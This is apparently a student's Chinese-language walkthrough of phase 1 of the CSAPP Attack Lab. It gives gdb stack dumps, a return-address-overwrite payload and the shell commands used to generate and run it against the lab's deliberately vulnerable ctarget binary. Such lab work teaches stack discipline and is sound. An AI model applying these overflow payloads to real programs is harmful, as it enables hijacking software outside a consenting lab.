## 实验说明
Note: This is the 64-bit successor to the 32-bit Buffer Lab. Students are given a pair of unique custom-generated x86-64 binary executables, called targets, that have buffer overflow bugs. One target is vulnerable to code injection attacks. The other is vulnerable to return-oriented programming attacks. Students are asked to modify the behavior of the targets by developing exploits based on either code injection or return-oriented programming. This lab teaches the students about the stack discipline and teaches them about the danger of writing code that is vulnerable to buffer overflow attacks.

## 实验准备
注意自己运行的话，要加上--q选项。
gdb 设置参数

```
(gdb) set args -q
```

查看断点
```
(gdb) i breakpoints
Num     Type           Disp Enb Address            What
1       breakpoint     keep y   0x00000000004011ad in main at main.c:97
        breakpoint already hit 1 time
3       breakpoint     keep y   0x0000000000401351 in main at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
```

## 实验过程
### phase_1
首先，进行注入式攻击的前提是了解过程调用时堆栈的变化过程。

将控制从函数P转移到函数Q时，需要简单地把程序计数器(PC)设置为Q的代码的起始位置。不过，当稍后从Q返回的时候，处理器必须记录好它需要继续P的执行的代码位置。在x86-64机器中，这个信息是用指令```call Q```调用Q来记录的。call指令将当前的指令地址A压入栈中，并将PC设置为Q的起始位置。压入堆栈中的地址A被称为返回地址，是紧跟在call指令后面那条指令的地址。对应的指令ret会从栈中弹出地址A，并把PC设置为A。

所以注入式攻击的实质，就是输入的字符串长度超过了缓存区的长度，并把rsp栈中的返回地址给覆盖掉，这样就可以操控程序被攻击代码所接管。

首先，我们进入test函数，并运行至调用```getbuf```函数前。在调用之前，首先我们检查一下rsp处栈的内容:
```
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    $0x8,%rsp
   0x000000000040196c <+4>:     mov    $0x0,%eax
=> 0x0000000000401971 <+9>:     callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    %eax,%edx
   0x0000000000401978 <+16>:    mov    $0x403188,%esi
   0x000000000040197d <+21>:    mov    $0x1,%edi
   0x0000000000401982 <+26>:    mov    $0x0,%eax
   0x0000000000401987 <+31>:    callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    $0x8,%rsp
   0x0000000000401990 <+40>:    retq
End of assembler dump.

(gdb) disass
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    $0x8,%rsp
   0x000000000040196c <+4>:     mov    $0x0,%eax
=> 0x0000000000401971 <+9>:     callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    %eax,%edx
   0x0000000000401978 <+16>:    mov    $0x403188,%esi
   0x000000000040197d <+21>:    mov    $0x1,%edi
   0x0000000000401982 <+26>:    mov    $0x0,%eax
   0x0000000000401987 <+31>:    callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:    add    $0x8,%rsp
   0x0000000000401990 <+40>:    retq
End of assembler dump.
(gdb) x/16xw $rsp
0x5561dca8:     0x00000002      0x00000000      0x00401f24      0x00000000
0x5561dcb8:     0x00000000      0x00000000      0xf4f4f4f4      0xf4f4f4f4
0x5561dcc8:     0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4
0x5561dcd8:     0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4
```
然后，我们si进入```getbuf```函数，并检查此时堆栈的值，可以看到调用前的地址0x0040197已经入栈:
```
(gdb) disass
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
End of assembler dump.
(gdb) x/16xw $rsp
0x5561dca0:     0x00401976      0x00000000      0x00000002      0x00000000
0x5561dcb0:     0x00401f24      0x00000000      0x00000000      0x00000000
0x5561dcc0:     0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4
0x5561dcd0:     0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4      0xf4f4f4f4
```
缓存区的大小被设置为0x28,也就是当我们输入的数据超过这个范围后，就可以改写返回地址了。这里要注意，栈的增长方向是向下的，同时我们的数据是小端法表示的，所以对于touch_1的地址，我们输入字符串的末尾字符应为00 c0 17 40。通过实验提供的工具函数，我们得到我们攻击字符的表达
```
xxxx(40个字符)004017c0
```
这里用shell来生成这串字符，顺便练了练shell脚本
```
echo -ne '' > exploit.txt; for i in {1..10}; do echo -ne '63 63 63 63 ' >> exploit.txt; done; echo -ne 'c0 17 40 00' >> exploit.txt;
./hex2raw < exploit.txt > exploit_raw.txt
./ctarget -q -i exploit_raw.txt
```

实验结果
```
./ctarget -q -i exploit_raw.txt
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 63 C0 17 40 00
```